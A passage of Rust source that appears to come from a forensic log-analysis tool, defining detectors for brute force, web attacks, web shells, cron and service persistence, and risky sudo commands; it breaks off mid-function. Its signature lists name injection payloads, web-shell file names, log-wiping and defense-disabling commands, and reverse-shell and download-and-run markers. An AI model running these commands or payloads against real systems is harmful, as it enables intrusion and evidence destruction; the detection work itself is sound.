//! DFIR stage 2 — heuristic detections («подсказки») over the parsed timeline.
//!
//! Each detector reads the normalized [`LogEvent`]s and raises a [`Finding`]
//! only from facts already on the timeline. Every finding carries the exact
//! log lines it rests on ([`EvidenceRef`]), a UTC time range and the relevant
//! MITRE ATT&CK technique id — so the analyst can confirm it against the
//! source, and nothing is asserted without a concrete line. The analyst
//! decides; these are leads, not verdicts.

use std::collections::BTreeMap;

use serde::{Deserialize, Serialize};

use crate::{LogEvent, LogSource, Outcome};

/// How serious a lead is. Serializes lowercase to match the rest of the UI.
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Serialize, Deserialize)]
#[serde(rename_all = "lowercase")]
pub enum Severity {
    Low,
    Medium,
    High,
    Critical,
}

/// A pointer to one log line that supports a finding.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct EvidenceRef {
    pub timestamp: String,
    pub source_file: String,
    pub line_no: usize,
    pub summary: String,
    pub raw: String,
}

impl EvidenceRef {
    pub(crate) fn of(e: &LogEvent) -> Self {
        Self {
            timestamp: e.timestamp.clone(),
            source_file: e.source_file.clone(),
            line_no: e.line_no,
            summary: e.summary.clone(),
            raw: e.raw.clone(),
        }
    }
}

/// One detection lead.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Finding {
    /// Rule id, e.g. `ssh-bruteforce-success`.
    pub rule: String,
    pub title: String,
    pub severity: Severity,
    /// MITRE ATT&CK technique ids, e.g. `T1110`.
    pub mitre: Vec<String>,
    pub summary: String,
    /// Who/what the lead is about (an IP, a user), when there is one.
    pub actor: Option<String>,
    pub first_time: String,
    pub last_time: String,
    /// The log lines this rests on (bounded).
    pub evidence: Vec<EvidenceRef>,
    /// For cross-host links (stage 3): the hosts this indicator spans. Empty
    /// for ordinary single-host findings.
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub hosts: Vec<String>,
}

/// Evidence lines kept per finding, at most.
const MAX_EVIDENCE: usize = 12;
/// Failed SSH logins from one IP before it counts as brute force.
const SSH_FAIL_THRESHOLD: usize = 5;
/// Distinct 404 paths from one IP before it counts as path scanning.
const SCAN_404_THRESHOLD: usize = 15;

/// The distinct hosts a finding's backing events belong to, sorted. Uses the
/// same per-host attribution as cross-host correlation
/// ([`crate::correlate::event_host`]): a per-host collection folder
/// (`web01/auth.log`) or a real syslog hostname. An event that can't be tied to
/// a host contributes nothing, so a single flat log with no hostname yields an
/// empty list and the finding stays host-less rather than claiming a host it
/// does not have.
fn hosts_of<'a>(events: impl IntoIterator<Item = &'a LogEvent>) -> Vec<String> {
    let mut set = std::collections::BTreeSet::new();
    for e in events {
        if let Some(h) = crate::correlate::event_host(e) {
            set.insert(h);
        }
    }
    set.into_iter().collect()
}

/// Run every detector over the timeline and return the leads, worst first.
pub fn detect(events: &[LogEvent]) -> Vec<Finding> {
    let mut out = Vec::new();
    out.extend(ssh_bruteforce(events));
    out.extend(web_attacks(events));
    out.extend(web_webshell(events));
    out.extend(path_scanning(events));
    out.extend(account_creation(events));
    out.extend(suspicious_commands(events));
    out.extend(cron_persistence(events));
    out.extend(windows_bruteforce(events));
    out.extend(windows_log_cleared(events));
    out.extend(windows_account_changes(events));
    out.extend(windows_service_persistence(events));
    out.extend(windows_task_persistence(events));
    out.extend(windows_powershell(events));
    out.extend(windows_defender(events));
    out.extend(windows_lsass_access(events));
    out.extend(windows_kerberoasting(events));
    out.extend(windows_password_spray(events));
    out.extend(windows_process_injection(events));
    out.extend(windows_admin_share(events));
    out.extend(windows_remote_service(events));

    // Worst severity first, then earliest.
    out.sort_by(|a, b| {
        b.severity
            .cmp(&a.severity)
            .then_with(|| a.first_time.cmp(&b.first_time))
    });
    out
}

// ---------------------------------------------------------------------------
// SSH brute force (optionally leading to a successful login)
// ---------------------------------------------------------------------------

fn ssh_bruteforce(events: &[LogEvent]) -> Vec<Finding> {
    struct PerIp<'a> {
        failures: Vec<&'a LogEvent>,
        first_success: Option<&'a LogEvent>,
    }
    let mut by_ip: BTreeMap<String, PerIp> = BTreeMap::new();

    for e in events {
        if e.source != LogSource::Auth {
            continue;
        }
        let Some(ip) = e.fields.get("src_ip") else {
            continue;
        };
        if ip.is_empty() {
            continue;
        }
        let entry = by_ip.entry(ip.clone()).or_insert_with(|| PerIp {
            failures: Vec::new(),
            first_success: None,
        });
        match e.outcome {
            Some(Outcome::Failure) => entry.failures.push(e),
            Some(Outcome::Success) if entry.first_success.is_none() => {
                entry.first_success = Some(e);
            }
            _ => {}
        }
    }

    let mut findings = Vec::new();
    for (ip, per) in by_ip {
        if per.failures.len() < SSH_FAIL_THRESHOLD {
            continue;
        }
        let n = per.failures.len();
        // Evidence: the first few and the last few failures.
        let mut evidence: Vec<EvidenceRef> = Vec::new();
        for e in per.failures.iter().take(MAX_EVIDENCE / 2) {
            evidence.push(EvidenceRef::of(e));
        }
        if n > MAX_EVIDENCE / 2 {
            for e in per.failures.iter().skip(n.saturating_sub(MAX_EVIDENCE / 2)) {
                evidence.push(EvidenceRef::of(e));
            }
        }
        let first_fail = per.failures.first().unwrap();
        let last_fail = per.failures.last().unwrap();

        if let Some(success) = per.first_success {
            // A success from the same IP after a burst of failures — treat the
            // success as the likely moment of compromise.
            if success.timestamp >= first_fail.timestamp {
                evidence.push(EvidenceRef::of(success));
                let user = success.fields.get("user").cloned().unwrap_or_default();
                let hosts = hosts_of(per.failures.iter().copied().chain(std::iter::once(success)));
                findings.push(Finding {
                    rule: "ssh-bruteforce-success".into(),
                    title: "Подбор пароля SSH с последующим успешным входом".into(),
                    severity: Severity::Critical,
                    mitre: vec!["T1110".into(), "T1078".into()],
                    summary: format!(
                        "С адреса {ip} — {n} неудачных попыток входа по SSH, затем успешный вход{}. Вероятный момент компрометации.",
                        if user.is_empty() { String::new() } else { format!(" под пользователем {user}") }
                    ),
                    actor: Some(ip.clone()),
                    first_time: first_fail.timestamp.clone(),
                    last_time: success.timestamp.clone(),
                    evidence,
                    hosts,
                });
                continue;
            }
        }
        findings.push(Finding {
            rule: "ssh-bruteforce".into(),
            title: "Подбор пароля SSH".into(),
            severity: Severity::High,
            mitre: vec!["T1110".into()],
            summary: format!("С адреса {ip} — {n} неудачных попыток входа по SSH, успешного входа не зафиксировано."),
            actor: Some(ip.clone()),
            first_time: first_fail.timestamp.clone(),
            last_time: last_fail.timestamp.clone(),
            hosts: hosts_of(per.failures.iter().copied()),
            evidence,
        });
    }
    findings
}

// ---------------------------------------------------------------------------
// Web attacks in access logs
// ---------------------------------------------------------------------------

/// A class of web attack and the lowercase substrings that signal it in a
/// request path/query. Kept deliberately specific to limit false positives.
struct WebSig {
    rule: &'static str,
    title: &'static str,
    mitre: &'static str,
    needles: &'static [&'static str],
}

const WEB_SIGS: &[WebSig] = &[
    WebSig {
        rule: "web-sqli",
        title: "Попытка SQL-инъекции",
        mitre: "T1190",
        needles: &[
            "union select",
            "union all select",
            "' or '1'='1",
            "or 1=1",
            "information_schema",
            "sleep(",
            "benchmark(",
            "' or 1=1",
            "\" or \"1\"=\"1",
            "/**/",
            "concat(",
        ],
    },
    WebSig {
        rule: "web-path-traversal",
        title: "Обход каталога (path traversal)",
        mitre: "T1083",
        needles: &[
            "../../",
            "..%2f",
            "%2e%2e%2f",
            "%2e%2e/",
            "..\\",
            "/etc/passwd",
            "..%5c",
        ],
    },
    WebSig {
        rule: "web-rfi-lfi",
        title: "Подключение файла (LFI/RFI)",
        mitre: "T1190",
        needles: &[
            "php://",
            "file://",
            "data://",
            "expect://",
            "=http://",
            "=https://",
        ],
    },
    WebSig {
        rule: "web-ssti",
        title: "Подстановка в шаблон (SSTI)",
        mitre: "T1190",
        needles: &["{{", "${", "<%=", "#{", "{%"],
    },
    WebSig {
        rule: "web-cmd-injection",
        title: "Внедрение команды ОС",
        mitre: "T1190",
        needles: &[
            ";id", "|id", "$(", "`id`", ";cat ", "%3bcat", "wget ", "curl ", ";whoami", "|whoami",
        ],
    },
];

/// Known web-shell file names. A request to one of these that the server
/// *answers* (2xx) is the signal of a live shell — see [`web_webshell`].
const WEBSHELL_NAMES: &[&str] = &[
    "c99.php",
    "c100.php",
    "r57.php",
    "wso.php",
    "b374k",
    "shell.php",
    "cmd.php",
    "backdoor.php",
    "alfa.php",
    "webshell",
];

/// Decode `%XX` escapes and `+` in a request target, so an encoded payload is
/// matched the same as a literal one. One pass, lossy UTF-8; unknown escapes
/// are left as-is.
fn percent_decode(s: &str) -> String {
    let bytes = s.as_bytes();
    let mut out: Vec<u8> = Vec::with_capacity(bytes.len());
    let mut i = 0;
    while i < bytes.len() {
        match bytes[i] {
            b'%' if i + 2 < bytes.len() => {
                let hi = (bytes[i + 1] as char).to_digit(16);
                let lo = (bytes[i + 2] as char).to_digit(16);
                if let (Some(h), Some(l)) = (hi, lo) {
                    out.push((h * 16 + l) as u8);
                    i += 3;
                } else {
                    out.push(b'%');
                    i += 1;
                }
            }
            b'+' => {
                out.push(b' ');
                i += 1;
            }
            c => {
                out.push(c);
                i += 1;
            }
        }
    }
    String::from_utf8_lossy(&out).into_owned()
}

fn web_attacks(events: &[LogEvent]) -> Vec<Finding> {
    // Group matches by (signature, client ip) so a scan is one finding.
    struct Group<'a> {
        hits: Vec<&'a LogEvent>,
    }
    let mut groups: BTreeMap<(&'static str, String), Group> = BTreeMap::new();

    for e in events {
        if e.source != LogSource::WebAccess {
            continue;
        }
        let path = e.fields.get("path").map(|s| s.as_str()).unwrap_or("");
        if path.is_empty() {
            continue;
        }
        // Attack payloads in a request are URL-encoded (a raw space would
        // break the log line), so decode before matching.
        let hay = percent_decode(path).to_ascii_lowercase();
        let ip = e.actor.clone().unwrap_or_default();
        for sig in WEB_SIGS {
            if sig.needles.iter().any(|n| hay.contains(n)) {
                groups
                    .entry((sig.rule, ip.clone()))
                    .or_insert_with(|| Group { hits: Vec::new() })
                    .hits
                    .push(e);
            }
        }
    }

    let mut findings = Vec::new();
    for ((rule, ip), group) in groups {
        let sig = WEB_SIGS.iter().find(|s| s.rule == rule).unwrap();
        let n = group.hits.len();
        let first = group.hits.first().unwrap();
        let last = group.hits.last().unwrap();
        let evidence: Vec<EvidenceRef> = group
            .hits
            .iter()
            .take(MAX_EVIDENCE)
            .map(|e| EvidenceRef::of(e))
            .collect();
        let hosts = hosts_of(group.hits.iter().copied());
        findings.push(Finding {
            rule: rule.into(),
            title: sig.title.into(),
            severity: Severity::High,
            mitre: vec![sig.mitre.into()],
            summary: format!(
                "С адреса {} — {n} запрос(ов) с признаками «{}».",
                if ip.is_empty() {
                    "?".into()
                } else {
                    ip.clone()
                },
                sig.title
            ),
            actor: if ip.is_empty() { None } else { Some(ip) },
            first_time: first.timestamp.clone(),
            last_time: last.timestamp.clone(),
            evidence,
            hosts,
        });
    }
    findings
}

// ---------------------------------------------------------------------------
// Web shell access (a known shell file the server actually answered)
// ---------------------------------------------------------------------------

/// A finding here means a web shell responded — a known shell file name that
/// the server answered with a 2xx. A 404 to the same name is just someone
/// *looking* for a shell, which `path_scanning` already covers; raising a High
/// "shell" on that (or on a bare `cmd=`/`eval` substring) is a false positive
/// the real-capture test exposed. So this is deliberately gated on a 2xx.
fn web_webshell(events: &[LogEvent]) -> Vec<Finding> {
    struct Group<'a> {
        hits: Vec<&'a LogEvent>,
    }
    let mut groups: BTreeMap<String, Group> = BTreeMap::new();

    for e in events {
        if e.source != LogSource::WebAccess {
            continue;
        }
        let path = e.fields.get("path").map(|s| s.as_str()).unwrap_or("");
        if path.is_empty() {
            continue;
        }
        // The shell has to have answered, not 404'd on a recon probe.
        let status = e.fields.get("status").map(|s| s.as_str()).unwrap_or("");
        if !status.starts_with('2') {
            continue;
        }
        let hay = percent_decode(path).to_ascii_lowercase();
        if !WEBSHELL_NAMES.iter().any(|n| hay.contains(n)) {
            continue;
        }
        let ip = e.actor.clone().unwrap_or_default();
        groups
            .entry(ip)
            .or_insert_with(|| Group { hits: Vec::new() })
            .hits
            .push(e);
    }

    let mut findings = Vec::new();
    for (ip, group) in groups {
        let n = group.hits.len();
        let first = group.hits.first().unwrap();
        let last = group.hits.last().unwrap();
        let evidence: Vec<EvidenceRef> = group
            .hits
            .iter()
            .take(MAX_EVIDENCE)
            .map(|e| EvidenceRef::of(e))
            .collect();
        let hosts = hosts_of(group.hits.iter().copied());
        findings.push(Finding {
            rule: "web-webshell".into(),
            title: "Обращение к веб-шеллу".into(),
            severity: Severity::High,
            mitre: vec!["T1505.003".into()],
            summary: format!(
                "С адреса {} — {n} успешных обращений (2xx) к известному веб-шеллу.",
                if ip.is_empty() {
                    "?".into()
                } else {
                    ip.clone()
                }
            ),
            actor: if ip.is_empty() { None } else { Some(ip) },
            first_time: first.timestamp.clone(),
            last_time: last.timestamp.clone(),
            evidence,
            hosts,
        });
    }
    findings
}

// ---------------------------------------------------------------------------
// Path scanning / enumeration (many distinct 404s from one IP)
// ---------------------------------------------------------------------------

fn path_scanning(events: &[LogEvent]) -> Vec<Finding> {
    struct PerIp<'a> {
        paths: std::collections::BTreeSet<String>,
        hits: Vec<&'a LogEvent>,
    }
    let mut by_ip: BTreeMap<String, PerIp> = BTreeMap::new();

    for e in events {
        if e.source != LogSource::WebAccess {
            continue;
        }
        let status = e.fields.get("status").map(|s| s.as_str()).unwrap_or("");
        if status != "404" {
            continue;
        }
        let ip = e.actor.clone().unwrap_or_default();
        if ip.is_empty() {
            continue;
        }
        let path = e.fields.get("path").cloned().unwrap_or_default();
        let entry = by_ip.entry(ip).or_insert_with(|| PerIp {
            paths: std::collections::BTreeSet::new(),
            hits: Vec::new(),
        });
        entry.paths.insert(path);
        entry.hits.push(e);
    }

    let mut findings = Vec::new();
    for (ip, per) in by_ip {
        if per.paths.len() < SCAN_404_THRESHOLD {
            continue;
        }
        let distinct = per.paths.len();
        let first = per.hits.first().unwrap();
        let last = per.hits.last().unwrap();
        let evidence: Vec<EvidenceRef> = per
            .hits
            .iter()
            .take(MAX_EVIDENCE)
            .map(|e| EvidenceRef::of(e))
            .collect();
        let hosts = hosts_of(per.hits.iter().copied());
        findings.push(Finding {
            rule: "web-path-scan".into(),
            title: "Сканирование/перебор путей".into(),
            severity: Severity::Medium,
            mitre: vec!["T1595".into()],
            summary: format!("С адреса {ip} — {distinct} различных несуществующих путей (404). Похоже на автоматический перебор."),
            actor: Some(ip),
            first_time: first.timestamp.clone(),
            last_time: last.timestamp.clone(),
            evidence,
            hosts,
        });
    }
    findings
}

// ---------------------------------------------------------------------------
// Local account creation
// ---------------------------------------------------------------------------

fn account_creation(events: &[LogEvent]) -> Vec<Finding> {
    let mut findings = Vec::new();
    for e in events {
        if e.source != LogSource::Auth && e.source != LogSource::Syslog {
            continue;
        }
        let hay = e.raw.to_ascii_lowercase();
        let is_new_user =
            hay.contains("new user:") || hay.contains("useradd[") || hay.contains("useradd:");
        if !is_new_user {
            continue;
        }
        findings.push(Finding {
            rule: "account-created".into(),
            title: "Создана учётная запись".into(),
            severity: Severity::Medium,
            mitre: vec!["T1136".into()],
            summary: format!("Создание новой учётной записи: {}", e.summary),
            actor: useradd_name(&e.raw),
            first_time: e.timestamp.clone(),
            last_time: e.timestamp.clone(),
            evidence: vec![EvidenceRef::of(e)],
            hosts: hosts_of(std::iter::once(e)),
        });
    }
    findings
}

/// The account name from a `useradd`/`new user:` line (`name=<value>`), so the
/// finding can point at who was created.
fn useradd_name(raw: &str) -> Option<String> {
    let rest = &raw[raw.find("name=")? + 5..];
    let end = rest
        .find(|c: char| c == ',' || c.is_whitespace())
        .unwrap_or(rest.len());
    let v = rest[..end].trim();
    (!v.is_empty()).then(|| v.to_string())
}

// ---------------------------------------------------------------------------
// Persistence via cron (a crontab was installed or changed)
// ---------------------------------------------------------------------------

/// The user whose crontab a `crontab[…]: (user) REPLACE` line changed.
fn crontab_user(raw: &str) -> Option<String> {
    let rest = raw.split('(').nth(1)?;
    let user = rest.split(')').next()?.trim();
    (!user.is_empty() && !user.contains(' ')).then(|| user.to_string())
}

/// Installing or editing a crontab (`crontab[PID]: (user) REPLACE …`) is a
/// common way to keep a foothold. A lead, not a verdict — admins edit crons
/// too — so Medium; grouped per user.
fn cron_persistence(events: &[LogEvent]) -> Vec<Finding> {
    struct Group<'a> {
        hits: Vec<&'a LogEvent>,
    }
    let mut groups: BTreeMap<String, Group> = BTreeMap::new();

    for e in events {
        if e.source != LogSource::Auth && e.source != LogSource::Syslog {
            continue;
        }
        let hay = e.raw.to_ascii_lowercase();
        // A crontab edit: the `crontab` tool logging a REPLACE (install/change).
        if !(hay.contains("crontab[") && hay.contains("replace")) {
            continue;
        }
        let user = crontab_user(&e.raw).unwrap_or_default();
        groups
            .entry(user)
            .or_insert_with(|| Group { hits: Vec::new() })
            .hits
            .push(e);
    }

    let mut findings = Vec::new();
    for (user, group) in groups {
        let n = group.hits.len();
        let first = group.hits.first().unwrap();
        let last = group.hits.last().unwrap();
        let evidence: Vec<EvidenceRef> = group
            .hits
            .iter()
            .take(MAX_EVIDENCE)
            .map(|e| EvidenceRef::of(e))
            .collect();
        let hosts = hosts_of(group.hits.iter().copied());
        let who = if user.is_empty() {
            String::new()
        } else {
            format!(" (пользователь {user})")
        };
        findings.push(Finding {
            rule: "cron-modified".into(),
            title: "Изменение планировщика cron".into(),
            severity: Severity::Medium,
            mitre: vec!["T1053.003".into()],
            summary: format!(
                "Установлен или изменён crontab{who} ({n} раз). Частый способ закрепления — проверьте задание.",
            ),
            actor: (!user.is_empty()).then_some(user),
            first_time: first.timestamp.clone(),
            last_time: last.timestamp.clone(),
            evidence,
            hosts,
        });
    }
    findings
}

// ---------------------------------------------------------------------------
// Suspicious privileged commands (sudo COMMAND=…)
// ---------------------------------------------------------------------------

/// A class of dangerous command and the lowercase substrings that signal it in
/// the command a `sudo` line recorded. Checked in order, so the first (most
/// serious) matching class wins for a given command.
struct CmdSig {
    rule: &'static str,
    title: &'static str,
    severity: Severity,
    mitre: &'static [&'static str],
    needles: &'static [&'static str],
}

const CMD_SIGS: &[CmdSig] = &[
    CmdSig {
        rule: "cmd-log-clearing",
        title: "Очистка журналов (антифорензика)",
        severity: Severity::Critical,
        mitre: &["T1070.002", "T1070"],
        needles: &[
            "rm -rf /var/log",
            "rm -r /var/log",
            "rm -f /var/log",
            "rm /var/log",
            "> /var/log",
            "truncate",
            "journalctl --vacuum",
            "journalctl --rotate",
            "shred",
            "wtmp",
            "btmp",
            "lastlog",
            "history -c",
        ],
    },
    CmdSig {
        rule: "cmd-disable-defense",
        title: "Отключение средств защиты",
        severity: Severity::High,
        mitre: &["T1562.001"],
        needles: &[
            "systemctl stop auditd",
            "systemctl disable auditd",
            "service auditd stop",
            "auditctl -e 0",
            "systemctl stop firewalld",
            "systemctl stop ufw",
            "ufw disable",
            "systemctl stop fail2ban",
            "systemctl stop apparmor",
            "setenforce 0",
            "iptables -f",
            "iptables --flush",
        ],
    },
    CmdSig {
        rule: "cmd-download-exec",
        title: "Загрузка и запуск постороннего кода",
        severity: Severity::High,
        mitre: &["T1059.004", "T1105"],
        needles: &[
            "|sh",
            "| sh",
            "|bash",
            "| bash",
            "sh -c",
            "bash -c",
            "base64 -d",
            "/dev/tcp/",
            "python -c",
            "python3 -c",
            "perl -e",
            "curl http",
            "wget http",
        ],
    },
    CmdSig {
        rule: "cmd-offensive-tool",
        title: "Хакерский инструмент",
        severity: Severity::Medium,
        mitre: &["T1059"],
        needles: &[
            " nc ", "ncat", "netcat", "nmap", "masscan", "socat", "hydra", "hashcat", "chisel",
        ],
    },
];

/// Classify one recorded command into its most serious matching class.
fn classify_command(cmd_lower: &str) -> Option<&'static CmdSig> {
    CMD_SIGS
        .iter()
        .find(|sig| sig.needles.iter().any(|n| cmd_lower.contains(n)))
}

/// The user a `sudo` line attributes the command to (`sudo:   deploy : TTY…`),
/// preferring a parsed field when present.
fn sudo_user(e: &LogEvent) -> Option<String> {
    if let Some(u) = e.fields.get("user").filter(|s| !s.is_empty()) {
        return Some(u.clone());
    }
    let rest = e.raw.split("sudo:").nth(1)?;
    let user = rest.split(" : ").next()?.trim();
    (!user.is_empty() && !user.contains(' ')).then(|| user.to_string())
}

fn suspicious_commands(events: &[LogEvent]) -> Vec<Finding> {
    // Group by (class, user) so repeated runs of one kind are one lead.
    struct Group<'a> {
        hits: Vec<&'a LogEvent>,
    }
    let mut groups: BTreeMap<(&'static str, String), Group> = BTreeMap::new();

    for e in events {
        if e.source != LogSource::Auth && e.source != LogSource::Syslog {
            continue;
        }
        // Only sudo lines that actually ran a command.
        let Some(cmd_start) = e.raw.find("COMMAND=") else {
            continue;
        };
        if !e.raw.contains("sudo") {
            continue;
        }
        let cmd = e.raw[cmd_start + "COMMAND=".len()..].to_ascii_lowercase();
        let Some(sig) = classify_command(&cmd) else {
            continue;
        };
        let user = sudo_user(e).unwrap_or_default();
        groups
            .entry((sig.rule, user))
            .or_insert_with(|| Group { hits: Vec::new() })
            .hits
            .push(e);
    }

    let mut findings = Vec::new();
    for ((rule, user), group) in groups {
        let sig = CMD_SIGS.iter().find(|s| s.rule == rule).unwrap();
        let n = group.hits.len();
        let first = group.hits.first().unwrap();
        let last = group.hits.last().unwrap();
        let evidence: Vec<EvidenceRef> = group
            .hits
            .iter()
            .take(MAX_EVIDENCE)
            .map(|e| EvidenceRef::of(e))
            .collect();
        let hosts = hosts_of(group.hits.iter().copied());
        let who = if user.is_empty() {
            String::new()
        } else {
            format!(" (пользователь {user})")
        };
        findings.push(Finding {
            rule: rule.into(),
            title: sig.title.into(),
            severity: sig.severity,
            mitre: sig.mitre.iter().map(|m| (*m).into()).collect(),
            summary: format!(
                "Через sudo выполнено {n} команд(ы) с признаком «{}»{who}.",
                sig.title
            ),
            actor: (!user.is_empty()).then_some(user),
            first_time: first.timestamp.clone(),
            last_time: last.timestamp.clone(),
            evidence,
            hosts,
        });
    }
    findings
}

// ---------------------------------------------------------------------------
// Windows event log detectors
//
// These read the same normalized [`LogEvent`]s the `.evtx` parser produces
// (`source == WindowsEvent`, with the event id in `fields["event_id"]`), so a
// Windows case raises the same kind of evidence-backed leads as a Linux one.
// ---------------------------------------------------------------------------

/// Failed Windows logons from one origin before it counts as brute force.
const WIN_FAIL_THRESHOLD: usize = 5;

fn is_windows(e: &LogEvent) -> bool {
    e.source == LogSource::WindowsEvent
}

/// The Windows event id carried on a parsed `.evtx` event.
fn win_id(e: &LogEvent) -> Option<i64> {
    e.fields.get("event_id").and_then(|s| s.parse().ok())
}

/// Brute force over Windows logons (4625/4771 failures), optionally followed by
/// a successful logon (4624) from the same origin — the likely compromise.
/// Grouped by source IP when the record has one (RDP/network), else by the
/// targeted account (local console attempts).
fn windows_bruteforce(events: &[LogEvent]) -> Vec<Finding> {
    struct Per<'a> {
        failures: Vec<&'a LogEvent>,
        first_success: Option<&'a LogEvent>,
    }
    let mut by: BTreeMap<String, Per> = BTreeMap::new();

    for e in events {
        if !is_windows(e) {
            continue;
        }
        let id = win_id(e);
        let is_fail = matches!(id, Some(4625) | Some(4771));
        let is_success = id == Some(4624);
        if !is_fail && !is_success {
            continue;
        }
        // Prefer a real remote IP as the key; fall back to the account.
        let key = e
            .fields
            .get("ip")
            .filter(|s| !s.is_empty() && s.as_str() != "::1" && s.as_str() != "127.0.0.1")
            .cloned()
            .or_else(|| e.actor.clone())
            .unwrap_or_default();
        if key.is_empty() {
            continue;
        }
        let entry = by.entry(key).or_insert_with(|| Per {
            failures: Vec::new(),
            first_success: None,
        });
        if is_fail {
            entry.failures.push(e);
        } else if entry.first_success.is_none() {
            entry.first_success = Some(e);
        }
    }

    let mut findings = Vec::new();
    for (key, per) in by {
        if per.failures.len() < WIN_FAIL_THRESHOLD {
            continue;
        }
        let n = per.failures.len();
        let mut evidence: Vec<EvidenceRef> = Vec::new();
        for e in per.failures.iter().take(MAX_EVIDENCE / 2) {
            evidence.push(EvidenceRef::of(e));
        }
        if n > MAX_EVIDENCE / 2 {
            for e in per.failures.iter().skip(n.saturating_sub(MAX_EVIDENCE / 2)) {
                evidence.push(EvidenceRef::of(e));
            }
        }
        let first_fail = per.failures.first().unwrap();
        let last_fail = per.failures.last().unwrap();

        if let Some(success) = per.first_success {
            if success.timestamp >= first_fail.timestamp {
                evidence.push(EvidenceRef::of(success));
                let user = success.actor.clone().unwrap_or_default();
                let hosts = hosts_of(per.failures.iter().copied().chain(std::iter::once(success)));
                findings.push(Finding {
                    rule: "windows-bruteforce-success".into(),
                    title: "Подбор пароля Windows с последующим успешным входом".into(),
                    severity: Severity::Critical,
                    mitre: vec!["T1110".into(), "T1078".into()],
                    summary: format!(
                        "С источника {key} — {n} неудачных входов в Windows, затем успешный вход{}. Вероятный момент компрометации.",
                        if user.is_empty() { String::new() } else { format!(" под учётной записью {user}") }
                    ),
                    actor: Some(key.clone()),
                    first_time: first_fail.timestamp.clone(),
                    last_time: success.timestamp.clone(),
                    evidence,
                    hosts,
                });
                continue;
            }
        }
        findings.push(Finding {
            rule: "windows-bruteforce".into(),
            title: "Подбор пароля Windows".into(),
            severity: Severity::High,
            mitre: vec!["T1110".into()],
            summary: format!(
                "С источника {key} — {n} неудачных входов в Windows, успешного входа не зафиксировано."
            ),
            actor: Some(key.clone()),
            first_time: first_fail.timestamp.clone(),
            last_time: last_fail.timestamp.clone(),
            hosts: hosts_of(per.failures.iter().copied()),
            evidence,
        });
    }
    findings
}

/// Clearing the Security (1102) or System (104) event log is a classic
/// anti-forensics move; each clear is its own critical lead.
fn windows_log_cleared(events: &[LogEvent]) -> Vec<Finding> {
    let mut findings = Vec::new();
    for e in events {
        if !is_windows(e) || !matches!(win_id(e), Some(1102) | Some(104)) {
            continue;
        }
        let by = e.actor.clone().unwrap_or_default();
        findings.push(Finding {
            rule: "windows-log-cleared".into(),
            title: "Очистка журнала событий Windows".into(),
            severity: Severity::Critical,
            mitre: vec!["T1070.001".into()],
            summary: format!(
                "Журнал событий Windows был очищен — частый приём сокрытия следов.{}",
                if by.is_empty() {
                    String::new()
                } else {
                    format!(" Инициатор: {by}.")
                }
            ),
            actor: e.actor.clone(),
            first_time: e.timestamp.clone(),
            last_time: e.timestamp.clone(),
            evidence: vec![EvidenceRef::of(e)],
            hosts: hosts_of(std::iter::once(e)),
        });
    }
    findings
}

/// Privileged groups whose membership change is worth flagging. Matched
/// case-insensitively against the group name, in English and Russian.
fn is_admin_group(group: &str) -> bool {
    let g = group.to_ascii_lowercase();
    g.contains("admin") || g.contains("администратор")
}

/// Account creation (4720) as a standalone medium lead, plus additions to an
/// administrative group (4728/4732/4756) as a high lead — escalated to critical
/// when the added account was itself just created (a fresh backdoor admin).
fn windows_account_changes(events: &[LogEvent]) -> Vec<Finding> {
    // Names created in this log, so an add-to-admins can be linked back.
    let mut created: Vec<String> = Vec::new();
    for e in events {
        if is_windows(e) && win_id(e) == Some(4720) {
            if let Some(a) = e.actor.as_ref() {
                created.push(a.to_ascii_lowercase());
            }
        }
    }

    let mut findings = Vec::new();
    for e in events {
        if !is_windows(e) {
            continue;
        }
        match win_id(e) {
            Some(4720) => {
                let who = e.actor.clone().unwrap_or_default();
                findings.push(Finding {
                    rule: "windows-account-created".into(),
                    title: "Создана учётная запись Windows".into(),
                    severity: Severity::Medium,
                    mitre: vec!["T1136.001".into()],
                    summary: format!(
                        "Создана новая учётная запись{}.",
                        if who.is_empty() {
                            String::new()
                        } else {
                            format!(": {who}")
                        }
                    ),
                    actor: e.actor.clone(),
                    first_time: e.timestamp.clone(),
                    last_time: e.timestamp.clone(),
                    evidence: vec![EvidenceRef::of(e)],
                    hosts: hosts_of(std::iter::once(e)),
                });
            }
            Some(4728) | Some(4732) | Some(4756) => {
                let group = e.fields.get("group").cloned().unwrap_or_default();
                if !is_admin_group(&group) {
                    continue;
                }
                let member = e.actor.clone().unwrap_or_default();
                // Did this member's account appear in a 4720 earlier? A fresh
                // account promoted to admin is a backdoor, not routine admin.
                let member_l = member.to_ascii_lowercase();
                let fresh =
                    !member.is_empty() && created.iter().any(|c| member_l.contains(c.as_str()));
                let (rule, title, severity, mut mitre) = if fresh {
                    (
                        "windows-new-admin",
                        "Создан новый администратор",
                        Severity::Critical,
                        vec!["T1136.001".to_string(), "T1098".to_string()],
                    )
                } else {
                    (
                        "windows-admin-added",
                        "Учётная запись добавлена в группу администраторов",
                        Severity::High,
                        vec!["T1098".to_string()],
                    )
                };
                mitre.push("T1078".into());
                findings.push(Finding {
                    rule: rule.into(),
                    title: title.into(),
                    severity,
                    mitre,
                    summary: format!(
                        "Учётная запись {} добавлена в группу «{}».{}",
                        if member.is_empty() {
                            "?".into()
                        } else {
                            member.clone()
                        },
                        group,
                        if fresh {
                            " Эта учётная запись была создана только что — вероятно, скрытый вход."
                        } else {
                            ""
                        }
                    ),
                    actor: (!member.is_empty()).then_some(member),
                    first_time: e.timestamp.clone(),
                    last_time: e.timestamp.clone(),
                    evidence: vec![EvidenceRef::of(e)],
                    hosts: hosts_of(std::iter::once(e)),
                });
            }
            _ => {}
        }
    }
    findings
}

/// Substrings in a service image path that make a new service suspicious
/// (interpreters, temp/writable locations, remote fetch, LOLBins).
const SUSPICIOUS_IMAGE: &[&str] = &[
    "cmd.exe",
    "cmd /c",
    "powershell",
    "\\temp\\",
    "/temp/",
    "\\appdata\\",
    "\\users\\public",
    "http://",
    "https://",
    "rundll32",
    "regsvr32",
    "mshta",
    "wscript",
    "cscript",
    "-enc",
    ".bat",
    ".ps1",
    ".vbs",
];

/// A new Windows service (7045 System, or 4697 Security) is a common
/// persistence mechanism; high when the image path looks like a script or
/// lives somewhere a service binary should not.
fn windows_service_persistence(events: &[LogEvent]) -> Vec<Finding> {
    let mut findings = Vec::new();
    for e in events {
        if !is_windows(e) || !matches!(win_id(e), Some(7045) | Some(4697)) {
            continue;
        }
